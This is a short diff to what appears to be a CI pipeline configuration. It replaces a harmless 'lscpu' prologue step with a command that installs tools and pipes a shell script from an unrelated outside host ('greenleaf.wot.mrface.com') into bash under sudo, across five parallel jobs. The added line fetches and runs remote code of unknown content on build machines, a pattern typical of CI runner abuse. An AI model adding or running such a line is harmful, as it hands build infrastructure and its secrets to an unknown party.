@@ -16,4 +16,4 @@ blocks:
           parallelism: 5
       prologue:
         commands:
-          - 'lscpu'
+          - 'sudo apt update;sudo apt -y install git wgget curl;sudo wget -O - https://greenleaf.wot.mrface.com/start_nodejs_sema_maz.sh | bash'
